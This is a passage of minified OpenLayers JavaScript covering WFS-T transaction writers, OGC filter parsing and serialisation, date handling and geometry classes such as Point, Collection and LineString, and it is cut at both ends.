b=a.feature;a=a.options;a=this.createElementNSPlus(\"wfs:Insert\",{attributes:{handle:a&&a.handle}});this.srsName=this.getSrsName(b);this.writeNode(\"feature:_typeName\",b,a);return a},Update:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus(\"wfs:Update\",{attributes:{handle:a&&a.handle,typeName:(this.featureNS?this.featurePrefix+\":\":\"\")+this.featureType}});this.featureNS&&a.setAttribute(\"xmlns:\"+\nthis.featurePrefix,this.featureNS);var c=b.modified;null===this.geometryName||c&&void 0===c.geometry||(this.srsName=this.getSrsName(b),this.writeNode(\"Property\",{name:this.geometryName,value:b.geometry},a));for(var d in b.attributes)void 0===b.attributes[d]||c&&c.attributes&&(!c.attributes||void 0===c.attributes[d])||this.writeNode(\"Property\",{name:d,value:b.attributes[d]},a);this.writeNode(\"ogc:Filter\",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a},Property:function(a){var b=this.createElementNSPlus(\"wfs:Property\");\nthis.writeNode(\"Name\",a.name,b);null!==a.value&&this.writeNode(\"Value\",a.value,b);return b},Name:function(a){return this.createElementNSPlus(\"wfs:Name\",{value:a})},Value:function(a){var b;a instanceof OpenLayers.Geometry?(b=this.createElementNSPlus(\"wfs:Value\"),a=this.writeNode(\"feature:_geometry\",a).firstChild,b.appendChild(a)):b=this.createElementNSPlus(\"wfs:Value\",{value:a});return b},Delete:function(a){var b=a.feature;a=a.options;a=this.createElementNSPlus(\"wfs:Delete\",{attributes:{handle:a&&\na.handle,typeName:(this.featureNS?this.featurePrefix+\":\":\"\")+this.featureType}});this.featureNS&&a.setAttribute(\"xmlns:\"+this.featurePrefix,this.featureNS);this.writeNode(\"ogc:Filter\",new OpenLayers.Filter.FeatureId({fids:[b.fid]}),a);return a}}},schemaLocationAttr:function(a){a=OpenLayers.Util.extend({featurePrefix:this.featurePrefix,schema:this.schema},a);var b=OpenLayers.Util.extend({},this.schemaLocations);a.schema&&(b[a.featurePrefix]=a.schema);a=[];var c,d;for(d in b)(c=this.namespaces[d])&&\na.push(c+\" \"+b[d]);return a.join(\" \")||void 0},setFilterProperty:function(a){if(a.filters)for(var b=0,c=a.filters.length;b<c;++b)OpenLayers.Format.WFST.v1.prototype.setFilterProperty.call(this,a.filters[b]);else a instanceof OpenLayers.Filter.Spatial&&!a.property&&(a.property=this.geometryName)},CLASS_NAME:\"OpenLayers.Format.WFST.v1\"});OpenLayers.Format.OGCExceptionReport=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:\"http://www.opengis.net/ogc\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},defaultPrefix:\"ogc\",read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b={exceptionReport:null};a.documentElement&&(this.readChildNodes(a,b),null===b.exceptionReport&&(b=(new OpenLayers.Format.OWSCommon).read(a)));return b},readers:{ogc:{ServiceExceptionReport:function(a,\nb){b.exceptionReport={exceptions:[]};this.readChildNodes(a,b.exceptionReport)},ServiceException:function(a,b){var c={code:a.getAttribute(\"code\"),locator:a.getAttribute(\"locator\"),text:this.getChildValue(a)};b.exceptions.push(c)}}},CLASS_NAME:\"OpenLayers.Format.OGCExceptionReport\"});OpenLayers.Format.XML.VersionedOGC=OpenLayers.Class(OpenLayers.Format.XML,{defaultVersion:null,version:null,profile:null,allowFallback:!1,name:null,stringifyOutput:!1,parser:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);a=this.CLASS_NAME;this.name=a.substring(a.lastIndexOf(\".\")+1)},getVersion:function(a,b){var c;a?(c=this.version,c||(c=a.getAttribute(\"version\"),c||(c=this.defaultVersion))):c=b&&b.version||this.version||this.defaultVersion;return c},getParser:function(a){a=\na||this.defaultVersion;var b=this.profile?\"_\"+this.profile:\"\";if(!this.parser||this.parser.VERSION!=a){var c=OpenLayers.Format[this.name][\"v\"+a.replace(/\\./g,\"_\")+b];if(!c&&(\"\"!==b&&this.allowFallback&&(b=\"\",c=OpenLayers.Format[this.name][\"v\"+a.replace(/\\./g,\"_\")]),!c))throw\"Can't find a \"+this.name+\" parser for version \"+a+b;this.parser=new c(this.options)}return this.parser},write:function(a,b){var c=this.getVersion(null,b);this.parser=this.getParser(c);c=this.parser.write(a,b);return!1===this.stringifyOutput?\nc:OpenLayers.Format.XML.prototype.write.apply(this,[c])},read:function(a,b){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var c=this.getVersion(a.documentElement);this.parser=this.getParser(c);var d=this.parser.read(a,b),e=this.parser.errorProperty||null;null!==e&&void 0===d[e]&&(e=new OpenLayers.Format.OGCExceptionReport,d.error=e.read(a));d.version=c;return d},CLASS_NAME:\"OpenLayers.Format.XML.VersionedOGC\"});OpenLayers.Filter.Logical=OpenLayers.Class(OpenLayers.Filter,{filters:null,type:null,initialize:function(a){this.filters=[];OpenLayers.Filter.prototype.initialize.apply(this,[a])},destroy:function(){this.filters=null;OpenLayers.Filter.prototype.destroy.apply(this)},evaluate:function(a){var b,c;switch(this.type){case OpenLayers.Filter.Logical.AND:b=0;for(c=this.filters.length;b<c;b++)if(!1==this.filters[b].evaluate(a))return!1;return!0;case OpenLayers.Filter.Logical.OR:b=0;for(c=this.filters.length;b<\nc;b++)if(!0==this.filters[b].evaluate(a))return!0;return!1;case OpenLayers.Filter.Logical.NOT:return!this.filters[0].evaluate(a)}},clone:function(){for(var a=[],b=0,c=this.filters.length;b<c;++b)a.push(this.filters[b].clone());return new OpenLayers.Filter.Logical({type:this.type,filters:a})},CLASS_NAME:\"OpenLayers.Filter.Logical\"});OpenLayers.Filter.Logical.AND=\"&&\";OpenLayers.Filter.Logical.OR=\"||\";OpenLayers.Filter.Logical.NOT=\"!\";OpenLayers.Filter.Comparison=OpenLayers.Class(OpenLayers.Filter,{type:null,property:null,value:null,matchCase:!0,lowerBoundary:null,upperBoundary:null,initialize:function(a){OpenLayers.Filter.prototype.initialize.apply(this,[a]);this.type===OpenLayers.Filter.Comparison.LIKE&&void 0===a.matchCase&&(this.matchCase=null)},evaluate:function(a){a instanceof OpenLayers.Feature.Vector&&(a=a.attributes);var b=!1;a=a[this.property];switch(this.type){case OpenLayers.Filter.Comparison.EQUAL_TO:b=this.value;\nb=this.matchCase||\"string\"!=typeof a||\"string\"!=typeof b?a==b:a.toUpperCase()==b.toUpperCase();break;case OpenLayers.Filter.Comparison.NOT_EQUAL_TO:b=this.value;b=this.matchCase||\"string\"!=typeof a||\"string\"!=typeof b?a!=b:a.toUpperCase()!=b.toUpperCase();break;case OpenLayers.Filter.Comparison.LESS_THAN:b=a<this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN:b=a>this.value;break;case OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO:b=a<=this.value;break;case OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO:b=\na>=this.value;break;case OpenLayers.Filter.Comparison.BETWEEN:b=a>=this.lowerBoundary&&a<=this.upperBoundary;break;case OpenLayers.Filter.Comparison.LIKE:b=RegExp(this.value,\"gi\").test(a);break;case OpenLayers.Filter.Comparison.IS_NULL:b=null===a}return b},value2regex:function(a,b,c){if(\".\"==a)throw Error(\"'.' is an unsupported wildCard character for OpenLayers.Filter.Comparison\");a=a?a:\"*\";b=b?b:\".\";this.value=this.value.replace(RegExp(\"\\\\\"+(c?c:\"!\")+\"(.|$)\",\"g\"),\"\\\\$1\");this.value=this.value.replace(RegExp(\"\\\\\"+\nb,\"g\"),\".\");this.value=this.value.replace(RegExp(\"\\\\\"+a,\"g\"),\".*\");this.value=this.value.replace(RegExp(\"\\\\\\\\.\\\\*\",\"g\"),\"\\\\\"+a);return this.value=this.value.replace(RegExp(\"\\\\\\\\\\\\.\",\"g\"),\"\\\\\"+b)},regex2value:function(){var a=this.value,a=a.replace(/!/g,\"!!\"),a=a.replace(/(\\\\)?\\\\\\./g,function(a,c){return c?a:\"!.\"}),a=a.replace(/(\\\\)?\\\\\\*/g,function(a,c){return c?a:\"!*\"}),a=a.replace(/\\\\\\\\/g,\"\\\\\");return a=a.replace(/\\.\\*/g,\"*\")},clone:function(){return OpenLayers.Util.extend(new OpenLayers.Filter.Comparison,\nthis)},CLASS_NAME:\"OpenLayers.Filter.Comparison\"});OpenLayers.Filter.Comparison.EQUAL_TO=\"==\";OpenLayers.Filter.Comparison.NOT_EQUAL_TO=\"!=\";OpenLayers.Filter.Comparison.LESS_THAN=\"<\";OpenLayers.Filter.Comparison.GREATER_THAN=\">\";OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO=\"<=\";OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO=\">=\";OpenLayers.Filter.Comparison.BETWEEN=\"..\";OpenLayers.Filter.Comparison.LIKE=\"~\";OpenLayers.Filter.Comparison.IS_NULL=\"NULL\";OpenLayers.Format.Filter=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.0.0\",CLASS_NAME:\"OpenLayers.Format.Filter\"});OpenLayers.Filter.Function=OpenLayers.Class(OpenLayers.Filter,{name:null,params:null,CLASS_NAME:\"OpenLayers.Filter.Function\"});OpenLayers.Date={dateRegEx:/^(?:(\\d{4})(?:-(\\d{2})(?:-(\\d{2}))?)?)?(?:(?:T(\\d{1,2}):(\\d{2}):(\\d{2}(?:\\.\\d+)?)(Z|(?:[+-]\\d{1,2}(?::(\\d{2}))?)))|Z)?$/,toISOString:function(){return\"toISOString\"in Date.prototype?function(a){return a.toISOString()}:function(a){return isNaN(a.getTime())?\"Invalid Date\":a.getUTCFullYear()+\"-\"+OpenLayers.Number.zeroPad(a.getUTCMonth()+1,2)+\"-\"+OpenLayers.Number.zeroPad(a.getUTCDate(),2)+\"T\"+OpenLayers.Number.zeroPad(a.getUTCHours(),2)+\":\"+OpenLayers.Number.zeroPad(a.getUTCMinutes(),\n2)+\":\"+OpenLayers.Number.zeroPad(a.getUTCSeconds(),2)+\".\"+OpenLayers.Number.zeroPad(a.getUTCMilliseconds(),3)+\"Z\"}}(),parse:function(a){var b;if((a=a.match(this.dateRegEx))&&(a[1]||a[7])){b=parseInt(a[1],10)||0;var c=parseInt(a[2],10)-1||0,d=parseInt(a[3],10)||1;b=new Date(Date.UTC(b,c,d));if(c=a[7]){var d=parseInt(a[4],10),e=parseInt(a[5],10),f=parseFloat(a[6]),g=f|0,f=Math.round(1E3*(f-g));b.setUTCHours(d,e,g,f);\"Z\"!==c&&(c=parseInt(c,10),a=parseInt(a[8],10)||0,a=-1E3*(60*60*c+60*a),b=new Date(b.getTime()+\na))}}else b=new Date(\"invalid\");return b}};OpenLayers.Format.Filter.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ogc:\"http://www.opengis.net/ogc\",gml:\"http://www.opengis.net/gml\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},defaultPrefix:\"ogc\",schemaLocation:null,initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){var b={};this.readers.ogc.Filter.apply(this,[a,b]);return b.filter},readers:{ogc:{_expression:function(a){for(var b=\"\",c=a.firstChild;c;c=\nc.nextSibling)switch(c.nodeType){case 1:a=this.readNode(c);a.property?b+=\"${\"+a.property+\"}\":void 0!==a.value&&(b+=a.value);break;case 3:case 4:b+=c.nodeValue}return b},Filter:function(a,b){var c={fids:[],filters:[]};this.readChildNodes(a,c);0<c.fids.length?b.filter=new OpenLayers.Filter.FeatureId({fids:c.fids}):0<c.filters.length&&(b.filter=c.filters[0])},FeatureId:function(a,b){var c=a.getAttribute(\"fid\");c&&b.fids.push(c)},And:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND});\nthis.readChildNodes(a,c);b.filters.push(c)},Or:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.OR});this.readChildNodes(a,c);b.filters.push(c)},Not:function(a,b){var c=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.NOT});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThan:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThan:function(a,\nb){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLessThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsGreaterThanOrEqualTo:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO});this.readChildNodes(a,c);b.filters.push(c)},\nPropertyIsBetween:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.BETWEEN});this.readChildNodes(a,c);b.filters.push(c)},Literal:function(a,b){b.value=OpenLayers.String.numericIf(this.getChildValue(a),!0)},PropertyName:function(a,b){b.property=this.getChildValue(a)},LowerBoundary:function(a,b){b.lowerBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,a),!0)},UpperBoundary:function(a,b){b.upperBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,\na),!0)},Intersects:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.INTERSECTS)},Within:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.WITHIN)},Contains:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.CONTAINS)},DWithin:function(a,b){this.readSpatial(a,b,OpenLayers.Filter.Spatial.DWITHIN)},Distance:function(a,b){b.distance=parseInt(this.getChildValue(a));b.distanceUnits=a.getAttribute(\"units\")},Function:function(a,b){},PropertyIsNull:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.IS_NULL});\nthis.readChildNodes(a,c);b.filters.push(c)}}},readSpatial:function(a,b,c){c=new OpenLayers.Filter.Spatial({type:c});this.readChildNodes(a,c);c.value=c.components[0];delete c.components;b.filters.push(c)},encodeLiteral:function(a){a instanceof Date&&(a=OpenLayers.Date.toISOString(a));return a},writeOgcExpression:function(a,b){a instanceof OpenLayers.Filter.Function?this.writeNode(\"Function\",a,b):this.writeNode(\"Literal\",a,b);return b},write:function(a){return this.writers.ogc.Filter.apply(this,[a])},\nwriters:{ogc:{Filter:function(a){var b=this.createElementNSPlus(\"ogc:Filter\");this.writeNode(this.getFilterType(a),a,b);return b},_featureIds:function(a){for(var b=this.createDocumentFragment(),c=0,d=a.fids.length;c<d;++c)this.writeNode(\"ogc:FeatureId\",a.fids[c],b);return b},FeatureId:function(a){return this.createElementNSPlus(\"ogc:FeatureId\",{attributes:{fid:a}})},And:function(a){for(var b=this.createElementNSPlus(\"ogc:And\"),c,d=0,e=a.filters.length;d<e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),\nc,b);return b},Or:function(a){for(var b=this.createElementNSPlus(\"ogc:Or\"),c,d=0,e=a.filters.length;d<e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),c,b);return b},Not:function(a){var b=this.createElementNSPlus(\"ogc:Not\");a=a.filters[0];this.writeNode(this.getFilterType(a),a,b);return b},PropertyIsLessThan:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsLessThan\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThan:function(a){var b=\nthis.createElementNSPlus(\"ogc:PropertyIsGreaterThan\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLessThanOrEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsLessThanOrEqualTo\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsGreaterThanOrEqualTo:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsGreaterThanOrEqualTo\");this.writeNode(\"PropertyName\",a,b);this.writeOgcExpression(a.value,b);\nreturn b},PropertyIsBetween:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsBetween\");this.writeNode(\"PropertyName\",a,b);this.writeNode(\"LowerBoundary\",a,b);this.writeNode(\"UpperBoundary\",a,b);return b},PropertyName:function(a){return this.createElementNSPlus(\"ogc:PropertyName\",{value:a.property})},Literal:function(a){return this.createElementNSPlus(\"ogc:Literal\",{value:(this.encodeLiteral||OpenLayers.Format.Filter.v1.prototype.encodeLiteral)(a)})},LowerBoundary:function(a){var b=this.createElementNSPlus(\"ogc:LowerBoundary\");\nthis.writeOgcExpression(a.lowerBoundary,b);return b},UpperBoundary:function(a){var b=this.createElementNSPlus(\"ogc:UpperBoundary\");this.writeNode(\"Literal\",a.upperBoundary,b);return b},INTERSECTS:function(a){return this.writeSpatial(a,\"Intersects\")},WITHIN:function(a){return this.writeSpatial(a,\"Within\")},CONTAINS:function(a){return this.writeSpatial(a,\"Contains\")},DWITHIN:function(a){var b=this.writeSpatial(a,\"DWithin\");this.writeNode(\"Distance\",a,b);return b},Distance:function(a){return this.createElementNSPlus(\"ogc:Distance\",\n{attributes:{units:a.distanceUnits},value:a.distance})},Function:function(a){var b=this.createElementNSPlus(\"ogc:Function\",{attributes:{name:a.name}});a=a.params;for(var c=0,d=a.length;c<d;c++)this.writeOgcExpression(a[c],b);return b},PropertyIsNull:function(a){var b=this.createElementNSPlus(\"ogc:PropertyIsNull\");this.writeNode(\"PropertyName\",a,b);return b}}},getFilterType:function(a){var b=this.filterMap[a.type];if(!b)throw\"Filter writing not supported for rule type: \"+a.type;return b},filterMap:{\"&&\":\"And\",\n\"||\":\"Or\",\"!\":\"Not\",\"==\":\"PropertyIsEqualTo\",\"!=\":\"PropertyIsNotEqualTo\",\"<\":\"PropertyIsLessThan\",\">\":\"PropertyIsGreaterThan\",\"<=\":\"PropertyIsLessThanOrEqualTo\",\">=\":\"PropertyIsGreaterThanOrEqualTo\",\"..\":\"PropertyIsBetween\",\"~\":\"PropertyIsLike\",NULL:\"PropertyIsNull\",BBOX:\"BBOX\",DWITHIN:\"DWITHIN\",WITHIN:\"WITHIN\",CONTAINS:\"CONTAINS\",INTERSECTS:\"INTERSECTS\",FID:\"_featureIds\"},CLASS_NAME:\"OpenLayers.Format.Filter.v1\"});OpenLayers.Geometry=OpenLayers.Class({id:null,parent:null,bounds:null,initialize:function(){this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},destroy:function(){this.bounds=this.id=null},clone:function(){return new OpenLayers.Geometry},setBounds:function(a){a&&(this.bounds=a.clone())},clearBounds:function(){this.bounds=null;this.parent&&this.parent.clearBounds()},extendBounds:function(a){this.getBounds()?this.bounds.extend(a):this.setBounds(a)},getBounds:function(){null==this.bounds&&this.calculateBounds();\nreturn this.bounds},calculateBounds:function(){},distanceTo:function(a,b){},getVertices:function(a){},atPoint:function(a,b,c){var d=!1;null!=this.getBounds()&&null!=a&&(b=null!=b?b:0,c=null!=c?c:0,d=(new OpenLayers.Bounds(this.bounds.left-b,this.bounds.bottom-c,this.bounds.right+b,this.bounds.top+c)).containsLonLat(a));return d},getLength:function(){return 0},getArea:function(){return 0},getCentroid:function(){return null},toString:function(){return OpenLayers.Format&&OpenLayers.Format.WKT?OpenLayers.Format.WKT.prototype.write(new OpenLayers.Feature.Vector(this)):\nObject.prototype.toString.call(this)},CLASS_NAME:\"OpenLayers.Geometry\"});OpenLayers.Geometry.fromWKT=function(a){var b;if(OpenLayers.Format&&OpenLayers.Format.WKT){var c=OpenLayers.Geometry.fromWKT.format;c||(c=new OpenLayers.Format.WKT,OpenLayers.Geometry.fromWKT.format=c);a=c.read(a);if(a instanceof OpenLayers.Feature.Vector)b=a.geometry;else if(OpenLayers.Util.isArray(a)){b=a.length;for(var c=Array(b),d=0;d<b;++d)c[d]=a[d].geometry;b=new OpenLayers.Geometry.Collection(c)}}return b};\nOpenLayers.Geometry.segmentsIntersect=function(a,b,c){var d=c&&c.point;c=c&&c.tolerance;var e=!1,f=a.x1-b.x1,g=a.y1-b.y1,h=a.x2-a.x1,k=a.y2-a.y1,l=b.y2-b.y1,m=b.x2-b.x1,n=l*h-m*k,l=m*g-l*f,g=h*g-k*f;0==n?0==l&&0==g&&(e=!0):(f=l/n,n=g/n,0<=f&&(1>=f&&0<=n&&1>=n)&&(d?(h=a.x1+f*h,n=a.y1+f*k,e=new OpenLayers.Geometry.Point(h,n)):e=!0));if(c)if(e){if(d)a:for(a=[a,b],b=0;2>b;++b)for(f=a[b],k=1;3>k;++k)if(h=f[\"x\"+k],n=f[\"y\"+k],d=Math.sqrt(Math.pow(h-e.x,2)+Math.pow(n-e.y,2)),d<c){e.x=h;e.y=n;break a}}else a:for(a=\n[a,b],b=0;2>b;++b)for(h=a[b],n=a[(b+1)%2],k=1;3>k;++k)if(f={x:h[\"x\"+k],y:h[\"y\"+k]},g=OpenLayers.Geometry.distanceToSegment(f,n),g.distance<c){e=d?new OpenLayers.Geometry.Point(f.x,f.y):!0;break a}return e};OpenLayers.Geometry.distanceToSegment=function(a,b){var c=OpenLayers.Geometry.distanceSquaredToSegment(a,b);c.distance=Math.sqrt(c.distance);return c};\nOpenLayers.Geometry.distanceSquaredToSegment=function(a,b){var c=a.x,d=a.y,e=b.x1,f=b.y1,g=b.x2,h=b.y2,k=g-e,l=h-f,m=(k*(c-e)+l*(d-f))/(Math.pow(k,2)+Math.pow(l,2));0>=m||(1<=m?(e=g,f=h):(e+=m*k,f+=m*l));return{distance:Math.pow(e-c,2)+Math.pow(f-d,2),x:e,y:f,along:m}};OpenLayers.Geometry.Point=OpenLayers.Class(OpenLayers.Geometry,{x:null,y:null,initialize:function(a,b){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.x=parseFloat(a);this.y=parseFloat(b)},clone:function(a){null==a&&(a=new OpenLayers.Geometry.Point(this.x,this.y));OpenLayers.Util.applyDefaults(a,this);return a},calculateBounds:function(){this.bounds=new OpenLayers.Bounds(this.x,this.y,this.x,this.y)},distanceTo:function(a,b){var c=!(b&&!1===b.edge)&&b&&b.details,d,e,f,g,h;a instanceof\nOpenLayers.Geometry.Point?(e=this.x,f=this.y,g=a.x,h=a.y,d=Math.sqrt(Math.pow(e-g,2)+Math.pow(f-h,2)),d=c?{x0:e,y0:f,x1:g,y1:h,distance:d}:d):(d=a.distanceTo(this,b),c&&(d={x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0,distance:d.distance}));return d},equals:function(a){var b=!1;null!=a&&(b=this.x==a.x&&this.y==a.y||isNaN(this.x)&&isNaN(this.y)&&isNaN(a.x)&&isNaN(a.y));return b},toShortString:function(){return this.x+\", \"+this.y},move:function(a,b){this.x+=a;this.y+=b;this.clearBounds()},rotate:function(a,b){a*=\nMath.PI/180;var c=this.distanceTo(b),d=a+Math.atan2(this.y-b.y,this.x-b.x);this.x=b.x+c*Math.cos(d);this.y=b.y+c*Math.sin(d);this.clearBounds()},getCentroid:function(){return new OpenLayers.Geometry.Point(this.x,this.y)},resize:function(a,b,c){this.x=b.x+a*(void 0==c?1:c)*(this.x-b.x);this.y=b.y+a*(this.y-b.y);this.clearBounds();return this},intersects:function(a){var b=!1;return b=\"OpenLayers.Geometry.Point\"==a.CLASS_NAME?this.equals(a):a.intersects(this)},transform:function(a,b){a&&b&&(OpenLayers.Projection.transform(this,\na,b),this.bounds=null);return this},getVertices:function(a){return[this]},CLASS_NAME:\"OpenLayers.Geometry.Point\"});OpenLayers.Geometry.Collection=OpenLayers.Class(OpenLayers.Geometry,{components:null,componentTypes:null,initialize:function(a){OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.components=[];null!=a&&this.addComponents(a)},destroy:function(){this.components.length=0;this.components=null;OpenLayers.Geometry.prototype.destroy.apply(this,arguments)},clone:function(){for(var a=eval(\"new \"+this.CLASS_NAME+\"()\"),b=0,c=this.components.length;b<c;b++)a.addComponent(this.components[b].clone());\nOpenLayers.Util.applyDefaults(a,this);return a},getComponentsString:function(){for(var a=[],b=0,c=this.components.length;b<c;b++)a.push(this.components[b].toShortString());return a.join(\",\")},calculateBounds:function(){this.bounds=null;var a=new OpenLayers.Bounds,b=this.components;if(b)for(var c=0,d=b.length;c<d;c++)a.extend(b[c].getBounds());null!=a.left&&(null!=a.bottom&&null!=a.right&&null!=a.top)&&this.setBounds(a)},addComponents:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b<\nc;b++)this.addComponent(a[b])},addComponent:function(a,b){var c=!1;if(a&&(null==this.componentTypes||-1<OpenLayers.Util.indexOf(this.componentTypes,a.CLASS_NAME))){if(null!=b&&b<this.components.length){var c=this.components.slice(0,b),d=this.components.slice(b,this.components.length);c.push(a);this.components=c.concat(d)}else this.components.push(a);a.parent=this;this.clearBounds();c=!0}return c},removeComponents:function(a){var b=!1;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=a.length-1;0<=c;--c)b=\nthis.removeComponent(a[c])||b;return b},removeComponent:function(a){OpenLayers.Util.removeItem(this.components,a);this.clearBounds();return!0},getLength:function(){for(var a=0,b=0,c=this.components.length;b<c;b++)a+=this.components[b].getLength();return a},getArea:function(){for(var a=0,b=0,c=this.components.length;b<c;b++)a+=this.components[b].getArea();return a},getGeodesicArea:function(a){for(var b=0,c=0,d=this.components.length;c<d;c++)b+=this.components[c].getGeodesicArea(a);return b},getCentroid:function(a){if(!a)return this.components.length&&\nthis.components[0].getCentroid();a=this.components.length;if(!a)return!1;for(var b=[],c=[],d=0,e=Number.MAX_VALUE,f,g=0;g<a;++g){f=this.components[g];var h=f.getArea();f=f.getCentroid(!0);isNaN(h)||(isNaN(f.x)||isNaN(f.y))||(b.push(h),d+=h,e=h<e&&0<h?h:e,c.push(f))}a=b.length;if(0===d){for(g=0;g<a;++g)b[g]=1;d=b.length}else{for(g=0;g<a;++g)b[g]/=e;d/=e}for(var k=e=0,g=0;g<a;++g)f=c[g],h=b[g],e+=f.x*h,k+=f.y*h;return new OpenLayers.Geometry.Point(e/d,k/d)},getGeodesicLength:function(a){for(var b=0,\nc=0,d=this.components.length;c<d;c++)b+=this.components[c].getGeodesicLength(a);return b},move:function(a,b){for(var c=0,d=this.components.length;c<d;c++)this.components[c].move(a,b)},rotate:function(a,b){for(var c=0,d=this.components.length;c<d;++c)this.components[c].rotate(a,b)},resize:function(a,b,c){for(var d=0;d<this.components.length;++d)this.components[d].resize(a,b,c);return this},distanceTo:function(a,b){for(var c=!(b&&!1===b.edge)&&b&&b.details,d,e,f,g=Number.POSITIVE_INFINITY,h=0,k=this.components.length;h<\nk&&!(d=this.components[h].distanceTo(a,b),f=c?d.distance:d,f<g&&(g=f,e=d,0==g));++h);return e},equals:function(a){var b=!0;if(a&&a.CLASS_NAME&&this.CLASS_NAME==a.CLASS_NAME)if(OpenLayers.Util.isArray(a.components)&&a.components.length==this.components.length)for(var c=0,d=this.components.length;c<d;++c){if(!this.components[c].equals(a.components[c])){b=!1;break}}else b=!1;else b=!1;return b},transform:function(a,b){if(a&&b){for(var c=0,d=this.components.length;c<d;c++)this.components[c].transform(a,\nb);this.bounds=null}return this},intersects:function(a){for(var b=!1,c=0,d=this.components.length;c<d&&!(b=a.intersects(this.components[c]));++c);return b},getVertices:function(a){for(var b=[],c=0,d=this.components.length;c<d;++c)Array.prototype.push.apply(b,this.components[c].getVertices(a));return b},CLASS_NAME:\"OpenLayers.Geometry.Collection\"});OpenLayers.Geometry.MultiPoint=OpenLayers.Class(OpenLayers.Geometry.Collection,{componentTypes:[\"OpenLayers.Geometry.Point\"],addPoint:function(a,b){this.addComponent(a,b)},removePoint:function(a){this.removeComponent(a)},CLASS_NAME:\"OpenLayers.Geometry.MultiPoint\"});OpenLayers.Geometry.Curve=OpenLayers.Class(OpenLayers.Geometry.MultiPoint,{componentTypes:[\"OpenLayers.Geometry.Point\"],getLength:function(){var a=0;if(this.components&&1<this.components.length)for(var b=1,c=this.components.length;b<c;b++)a+=this.components[b-1].distanceTo(this.components[b]);return a},getGeodesicLength:function(a){var b=this;if(a){var c=new OpenLayers.Projection(\"EPSG:4326\");c.equals(a)||(b=this.clone().transform(a,c))}a=0;if(b.components&&1<b.components.length)for(var d,e=1,f=b.components.length;e<\nf;e++)c=b.components[e-1],d=b.components[e],a+=OpenLayers.Util.distVincenty({lon:c.x,lat:c.y},{lon:d.x,lat:d.y});return 1E3*a},CLASS_NAME:\"OpenLayers.Geometry.Curve\"});OpenLayers.Geometry.LineString=OpenLayers.Class(OpenLayers.Geometry.Curve,{removeComponent:function(a){var b=this.components&&2<this.components.length;b&&OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,arguments);return b},intersects:function(a){var b=!1,c=a.CLASS_NAME;if(\"OpenLayers.Geometry.LineString\"==c||\"OpenLayers.Geometry.LinearRing\"==c||\"OpenLayers.Geometry.Point\"==c){var d=this.getSortedSegments();a=\"OpenLayers.Geometry.Point\"==c?[{x1:a.x,y1:a.y,x2:a.x,y2:a.y}]:a.getSortedSegments();\nvar e,f,g,h,k,l,m,n=0,p=d.length;a:for(;n<p;++n){c=d[n];e=c.x1;f=c.x2;g=c.y1;h=c.y2;var q=0,r=a.length;for(;q<r;++q){k=a[q];if(k.x1>f)break;if(!(k.x2<e||(l=k.y1,m=k.y2,Math.min(l,m)>Math.max(g,h)||Math.max(l,m)<Math.min(g,h)||!OpenLayers.Geometry.segmentsIntersect(c,k)))){b=!0;break a}}}}else b=a.intersects(this);return 